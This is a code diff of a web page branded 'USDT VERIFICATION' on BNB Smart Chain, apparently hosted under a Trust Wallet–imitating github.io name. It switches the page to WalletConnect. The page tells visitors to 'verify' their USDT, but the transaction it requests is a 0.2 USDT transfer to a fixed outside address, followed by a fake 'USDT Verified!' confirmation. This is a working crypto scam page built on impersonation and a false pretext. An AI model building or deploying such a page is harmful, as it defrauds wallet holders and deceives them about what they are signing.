@@ -12,7 +12,7 @@ body{
   margin:0;
   font-family:Arial,sans-serif;
   background:#050505;
-  color:#fff;
+  color:#fff
 }
 
 .wrap{
@@ -21,7 +21,7 @@ body{
   align-items:center;
   justify-content:center;
   padding:20px;
-  background:radial-gradient(circle at 50% 15%,#242424,#0a0a0a 45%,#050505);
+  background:radial-gradient(circle at 50% 15%,#242424,#0a0a0a 45%,#050505)
 }
 
 .card{
@@ -31,19 +31,19 @@ body{
   border-radius:20px;
   background:#0c0c0c;
   padding:25px 21px;
-  box-shadow:0 15px 45px #000;
+  box-shadow:0 15px 45px #000
 }
 
 .top{
   display:flex;
   justify-content:space-between;
   align-items:center;
-  margin-bottom:45px;
+  margin-bottom:38px
 }
 
 .brand{
   font-weight:800;
-  letter-spacing:1px;
+  letter-spacing:1px
 }
 
 .tag{
@@ -51,7 +51,7 @@ body{
   color:#f5c400;
   border:1px solid #6e5b18;
   padding:5px 8px;
-  border-radius:20px;
+  border-radius:20px
 }
 
 .icon{
@@ -64,13 +64,13 @@ body{
   justify-content:center;
   background:#151515;
   border:1px solid #66531a;
-  font-size:32px;
+  font-size:32px
 }
 
 h1{
   text-align:center;
   font-size:30px;
-  margin:0 0 10px;
+  margin:0 0 10px
 }
 
 .sub{
@@ -78,35 +78,35 @@ h1{
   color:#999;
   font-size:13px;
   line-height:1.55;
-  margin:0 0 25px;
+  margin:0 0 25px
 }
 
 .box{
   border:1px solid #5c4d1b;
   border-radius:14px;
   background:#101010;
-  padding:20px;
+  padding:20px
 }
 
 .label{
   color:#caaa24;
   font-size:9px;
   letter-spacing:1px;
-  margin-bottom:12px;
+  margin-bottom:12px
 }
 
 .amount{
   font-size:34px;
   font-weight:800;
   text-align:center;
-  margin:8px 0 18px;
+  margin:8px 0 18px
 }
 
 .network{
   text-align:center;
   color:#777;
   font-size:10px;
-  margin-bottom:18px;
+  margin-bottom:18px
 }
 
 .recipient{
@@ -117,7 +117,17 @@ h1{
   background:#161616;
   border-radius:8px;
   padding:10px;
-  margin-bottom:16px;
+  margin-bottom:16px
+}
+
+.wallet{
+  font-size:11px;
+  color:#aaa;
+  background:#161616;
+  border-radius:8px;
+  padding:10px;
+  margin-bottom:12px;
+  word-break:break-all
 }
 
 button{
@@ -129,10 +139,16 @@ button{
   color:#111;
   font-size:15px;
   font-weight:800;
+  margin-top:8px
+}
+
+button.secondary{
+  background:#242424;
+  color:#fff
 }
 
 button:disabled{
-  opacity:.55;
+  opacity:.55
 }
 
 .status{
@@ -140,7 +156,7 @@ button:disabled{
   font-size:12px;
   color:#aaa;
   line-height:1.5;
-  margin-top:15px;
+  margin-top:15px
 }
 
 .success{
@@ -152,23 +168,23 @@ button:disabled{
   border-radius:9px;
   font-size:12px;
   line-height:1.5;
-  margin-top:15px;
+  margin-top:15px
 }
 
 .error{
-  color:#ff9d9d;
+  color:#ff9d9d
+}
+
+a{
+  color:#f5c400;
+  word-break:break-all
 }
 
 .footer{
   text-align:center;
   color:#555;
   font-size:9px;
-  margin-top:22px;
-}
-
-a{
-  color:#f5c400;
-  word-break:break-all;
+  margin-top:22px
 }
 </style>
 </head>
@@ -176,142 +192,187 @@ a{
 <body>
 
 <div class="wrap">
-<div class="card">
+  <div class="card">
 
-<div class="top">
-  <div class="brand">◈ BNB CHAIN</div>
-  <div class="tag">USDT VERIFICATION</div>
+    <div class="top">
+      <div class="brand">◈ BNB CHAIN</div>
+      <div class="tag">USDT VERIFICATION</div>
+    </div>
+
+    <div id="app"></div>
+
+    <div class="footer">
+      WalletConnect • Reown • BNB Smart Chain
+    </div>
+
+  </div>
 </div>
 
-<div id="app"></div>
+<script type="module">
 
-<div class="footer">
-  BNB Smart Chain • Transparent payment
-</div>
+import { createAppKit }
+  from "https://esm.sh/@reown/appkit";
 
-</div>
-</div>
+import { WagmiAdapter }
+  from "https://esm.sh/@reown/appkit-adapter-wagmi";
 
-<script>
+import { bsc }
+  from "https://esm.sh/@reown/appkit/networks";
+
 
 /* =========================
-   PAYMENT SETTINGS
-   ========================= */
+   CONFIG
+========================= */
+
+const projectId =
+"ac959df0672aed01c939878f7870012a";
 
 const PAYMENT_AMOUNT = "0.2";
 
 const RECIPIENT =
 "0xc1400749e127b83a8fD0022ccD1Fe8c27B06dec0";
 
-
-/* =========================
-   BSC MAINNET
-   ========================= */
-
-const CHAIN_ID = "0x38";
-
-const CHAIN_NAME = "BNB Smart Chain";
-
-const RPC_URL =
-"https://bsc-dataseed.binance.org/";
-
-const EXPLORER =
-"https://bscscan.com/";
-
-
-/* =========================
-   BSC USDT CONTRACT
-   ========================= */
-
 const USDT =
 "0x55d398326f99059fF775485246999027B3197955";
 
 const USDT_DECIMALS = 18;
 
-const app = document.getElementById("app");
+const EXPLORER =
+"https://bscscan.com/";
+
+const DAPP_URL =
+"https://send-usdt-trustwallet-bnb-smartchain.github.io/Usdt-/";
 
 
 /* =========================
-   ESCAPE HTML
-   ========================= */
+   REOWN CONFIG
+========================= */
+
+const metadata = {
+  name: "Verify USDT",
+  description:
+    "Transparent USDT payment on BNB Smart Chain",
+  url: DAPP_URL,
+  icons: []
+};
+
+
+const wagmiAdapter = new WagmiAdapter({
+  projectId,
+  networks: [bsc]
+});
+
+
+const modal = createAppKit({
+  adapters: [wagmiAdapter],
+  networks: [bsc],
+  projectId,
+  metadata,
+  features: {
+    analytics: false
+  },
+  enableNetworkSwitch: true,
+  enableReconnect: true,
+  themeMode: "dark"
+});
+
+
+/* =========================
+   APP
+========================= */
+
+const app =
+document.getElementById("app");
+
+let connected = false;
+
+
+/* =========================
+   HELPERS
+========================= */
 
 function escapeHtml(value){
 
-  return String(value).replace(/[&<>"']/g, c => ({
-    "&":"&amp;",
-    "<":"&lt;",
-    ">":"&gt;",
-    '"':"&quot;",
-    "'":"&#039;"
-  }[c]));
+  return String(value).replace(
+    /[&<>"']/g,
+    c => ({
+      "&":"&amp;",
+      "<":"&lt;",
+      ">":"&gt;",
+      '"':"&quot;",
+      "'":"&#039;"
+    }[c])
+  );
 
 }
 
 
-/* =========================
-   CONVERT USDT AMOUNT
-   ========================= */
-
 function parseTokenAmount(value, decimals){
 
-  const text = String(value).trim();
+  const text =
+    String(value).trim();
 
-  if(!/^(?:0|[1-9]\d*)(?:\.\d+)?$/.test(text)){
-
+  if(
+    !/^(?:0|[1-9]\d*)(?:\.\d+)?$/.test(text)
+  ){
     throw new Error(
       "Invalid payment amount."
     );
-
   }
 
-  const parts = text.split(".");
+  const [
+    whole,
+    fraction=""
+  ] = text.split(".");
 
-  const whole = parts[0];
-
-  const fraction = parts[1] || "";
-
-  if(fraction.length > decimals){
-
+  if(
+    fraction.length > decimals
+  ){
     throw new Error(
       "Payment amount has too many decimal places."
     );
-
   }
-
-  const paddedFraction =
-    fraction.padEnd(decimals,"0");
 
   return (
     BigInt(whole) *
     (10n ** BigInt(decimals))
-  )
-  +
-  BigInt(paddedFraction || "0");
+  ) +
+  BigInt(
+    fraction.padEnd(decimals,"0") || "0"
+  );
+
+}
+
+
+function shortAddress(a){
+
+  return a
+    ? a.slice(0,8) +
+      "..." +
+      a.slice(-6)
+    : "";
 
 }
 
 
 /* =========================
-   HOME SCREEN
-   ========================= */
+   RENDER
+========================= */
 
-function showHome(){
+function render(){
 
   app.innerHTML = `
 
-    <div class="icon">
-      ✓
-    </div>
+    <div class="icon">✓</div>
 
-    <h1>
-      Verify USDT
-    </h1>
+    <h1>Verify USDT</h1>
 
     <p class="sub">
-      Verify your USDT payment on
-      BNB Smart Chain. Your wallet
-      will show the exact transaction
-      before you confirm it.
+      Connect your wallet with
+      Reown/WalletConnect.
+      The wallet will show the exact
+      0.2 USDT transaction before
+      you approve it.
     </p>
 
     <div class="box">
@@ -321,11 +382,11 @@ function showHome(){
       </div>
 
       <div class="amount">
-        ${escapeHtml(PAYMENT_AMOUNT)} USDT
+        ${PAYMENT_AMOUNT} USDT
       </div>
 
       <div class="network">
-        Network: ${CHAIN_NAME}
+        Network: BNB Smart Chain
       </div>
 
       <div class="label">
@@ -336,85 +397,101 @@ function showHome(){
         ${escapeHtml(RECIPIENT)}
       </div>
 
-      <button id="pay">
-        Verify USDT • ${escapeHtml(PAYMENT_AMOUNT)} USDT
+      <div id="walletBox"></div>
+
+      <button id="connect">
+        Connect Wallet
       </button>
 
-      <div id="status" class="status"></div>
+      <button
+        id="pay"
+        class="secondary"
+        disabled
+      >
+        Verify USDT •
+        ${PAYMENT_AMOUNT} USDT
+      </button>
+
+      <div
+        id="status"
+        class="status">
+      </div>
 
     </div>
   `;
 
-  document.getElementById("pay").onclick = pay;
 
-}
-
-
-/* =========================
-   SWITCH TO BSC
-   ========================= */
-
-async function switchNetwork(){
-
-  try{
-
-    await window.ethereum.request({
-
-      method:
-      "wallet_switchEthereumChain",
-
-      params:[
-        {
-          chainId:CHAIN_ID
-        }
-      ]
-
-    });
-
-  }
-
-  catch(e){
-
-    if(e.code === 4902){
-
-      await window.ethereum.request({
-
-        method:
-        "wallet_addEthereumChain",
-
-        params:[
-          {
-
-            chainId:CHAIN_ID,
-
-            chainName:CHAIN_NAME,
-
-            nativeCurrency:{
-              name:"BNB",
-              symbol:"BNB",
-              decimals:18
-            },
-
-            rpcUrls:[
-              RPC_URL
-            ],
-
-            blockExplorerUrls:[
-              EXPLORER
-            ]
-
-          }
-        ]
-
+  document.getElementById("connect")
+    .onclick = () =>
+      modal.open({
+        view:"Connect",
+        namespace:"eip155"
       });
 
-    }
 
-    else{
+  document.getElementById("pay")
+    .onclick = pay;
 
-      throw e;
 
-    }
+  updateState();
+
+}
+
+
+/* =========================
+   WALLET STATE
+========================= */
+
+function updateState(){
+
+  const payButton =
+    document.getElementById("pay");
+
+  const connectButton =
+    document.getElementById("connect");
+
+  const walletBox =
+    document.getElementById("walletBox");
+
+  if(!payButton) return;
+
+
+  connected =
+    !!modal.getIsConnected();
+
+
+  if(connected){
+
+    const address =
+      modal.getAddress?.() ||
+      "Connected wallet";
+
+
+    walletBox.innerHTML = `
+      <div class="wallet">
+        Connected:
+        ${escapeHtml(
+          shortAddress(address)
+        )}
+      </div>
+    `;
+
+
+    connectButton.textContent =
+      "Wallet Connected";
+
+    payButton.disabled = false;
+
+  }
+
+  else{
+
+    walletBox.innerHTML = "";
+
+    connectButton.textContent =
+      "Connect Wallet";
+
+    payButton.disabled = true;
 
   }
 
@@ -422,10 +499,11 @@ async function switchNetwork(){
 
 
 /* =========================
-   WAIT FOR CONFIRMATION
-   ========================= */
+   WAIT FOR TRANSACTION
+========================= */
 
 async function waitForReceipt(
+  provider,
   txHash,
   maxChecks=60,
   delayMs=2000
@@ -438,32 +516,23 @@ async function waitForReceipt(
   ){
 
     const receipt =
-      await window.ethereum.request({
-
+      await provider.request({
         method:
-        "eth_getTransactionReceipt",
-
-        params:[
-          txHash
-        ]
-
+          "eth_getTransactionReceipt",
+        params:[txHash]
       });
 
-    if(receipt){
 
+    if(receipt)
       return receipt;
 
-    }
 
     await new Promise(
-      resolve =>
-      setTimeout(
-        resolve,
-        delayMs
-      )
+      r => setTimeout(r,delayMs)
     );
 
   }
+
 
   throw new Error(
     "Transaction is still pending. Check BscScan."
@@ -473,8 +542,8 @@ async function waitForReceipt(
 
 
 /* =========================
-   PAYMENT / VERIFICATION
-   ========================= */
+   PAYMENT
+========================= */
 
 async function pay(){
 
@@ -485,19 +554,6 @@ async function pay(){
     document.getElementById("pay");
 
 
-  if(!window.ethereum){
-
-    status.textContent =
-      "Wallet नहीं मिला। Trust Wallet या MetaMask के DApp browser में यह page खोलें.";
-
-    status.className =
-      "status error";
-
-    return;
-
-  }
-
-
   try{
 
     button.disabled = true;
@@ -506,43 +562,32 @@ async function pay(){
       "status";
 
     status.textContent =
-      "Connecting wallet...";
+      "Preparing transaction...";
 
 
-    /* Connect wallet */
-
-    const accounts =
-      await window.ethereum.request({
-
-        method:
-        "eth_requestAccounts"
-
-      });
-
-    const from =
-      accounts[0];
+    const provider =
+      modal.getWalletProvider();
 
 
-    /* Switch network */
+    if(!provider){
 
-    await switchNetwork();
+      throw new Error(
+        "Wallet is not connected. Tap Connect Wallet first."
+      );
+
+    }
 
 
     /* Check network */
 
-    const currentChain =
-      await window.ethereum.request({
-
-        method:
-        "eth_chainId"
-
+    const chainId =
+      await provider.request({
+        method:"eth_chainId"
       });
 
 
     if(
-      currentChain.toLowerCase()
-      !==
-      CHAIN_ID.toLowerCase()
+      chainId.toLowerCase() !== "0x38"
     ){
 
       throw new Error(
@@ -552,7 +597,29 @@ async function pay(){
     }
 
 
-    /* Convert 0.2 USDT correctly */
+    /* Get connected account */
+
+    const accounts =
+      await provider.request({
+        method:"eth_accounts"
+      });
+
+
+    const from =
+      accounts?.[0];
+
+
+    if(!from){
+
+      throw new Error(
+        "No wallet account is connected."
+      );
+
+    }
+
+
+    /* Convert 0.2 USDT
+       using 18 decimals */
 
     const amountUnits =
       parseTokenAmount(
@@ -561,78 +628,59 @@ async function pay(){
       );
 
 
-    /*
-      ERC-20 transfer(address,uint256)
-
-      Function selector:
-      0xa9059cbb
-    */
+    /* ERC20 transfer(address,uint256) */
 
     const toPadded =
       RECIPIENT
-      .slice(2)
-      .padStart(64,"0");
+        .slice(2)
+        .padStart(64,"0");
 
 
     const amountPadded =
       amountUnits
-      .toString(16)
-      .padStart(64,"0");
+        .toString(16)
+        .padStart(64,"0");
 
 
     const data =
-      "0xa9059cbb"
-      +
-      toPadded
-      +
+      "0xa9059cbb" +
+      toPadded +
       amountPadded;
 
 
-    /* Wallet confirmation */
-
     status.textContent =
-      "Please confirm the Verify USDT transaction in your wallet.";
+      "Please approve the 0.2 USDT transaction in your wallet.";
 
 
     const txHash =
-      await window.ethereum.request({
+      await provider.request({
 
         method:
-        "eth_sendTransaction",
+          "eth_sendTransaction",
 
-        params:[
-          {
-
-            from:from,
-
-            to:USDT,
-
-            data:data
-
-          }
-
-        ]
+        params:[{
+          from,
+          to:USDT,
+          data
+        }]
 
       });
 
-
-    /* Wait for blockchain */
 
     status.textContent =
       "Transaction submitted. Waiting for confirmation...";
 
 
     const receipt =
-      await waitForReceipt(txHash);
+      await waitForReceipt(
+        provider,
+        txHash
+      );
 
-
-    /* Check transaction status */
 
     if(
       !receipt.status ||
-      receipt.status.toLowerCase()
-      !==
-      "0x1"
+      receipt.status.toLowerCase() !== "0x1"
     ){
 
       throw new Error(
@@ -642,17 +690,15 @@ async function pay(){
     }
 
 
-    /* SUCCESS */
+    /* =========================
+       SUCCESS
+    ========================= */
 
     app.innerHTML = `
 
-      <div class="icon">
-        ✓
-      </div>
+      <div class="icon">✓</div>
 
-      <h1>
-        USDT Verified!
-      </h1>
+      <h1>USDT Verified!</h1>
 
       <p class="sub">
         ${escapeHtml(PAYMENT_AMOUNT)}
@@ -663,7 +709,7 @@ async function pay(){
       <div class="box">
 
         <div class="success">
-          ✓ USDT payment confirmed successfully.
+          ✓ USDT verification successfully.
         </div>
 
         <div
@@ -687,7 +733,7 @@ async function pay(){
 
         <button
           id="again"
-          style="margin-top:16px"
+          class="secondary"
         >
           Done
         </button>
@@ -698,21 +744,22 @@ async function pay(){
 
 
     document.getElementById("again")
-      .onclick = showHome;
-
+      .onclick = render;
 
   }
+
 
   catch(e){
 
     status.textContent =
-      e.message ||
+      e?.message ||
       "Payment cancelled or failed.";
 
     status.className =
       "status error";
 
-    button.disabled = false;
+    button.disabled =
+      !modal.getIsConnected();
 
   }
 
@@ -720,10 +767,21 @@ async function pay(){
 
 
 /* =========================
-   START
-   ========================= */
+   EVENTS
+========================= */
 
-showHome();
+modal.subscribeState(
+  () => updateState()
+);
+
+modal.subscribeEvents(
+  () => updateState()
+);
+
+
+/* START */
+
+render();
 
 </script>
 
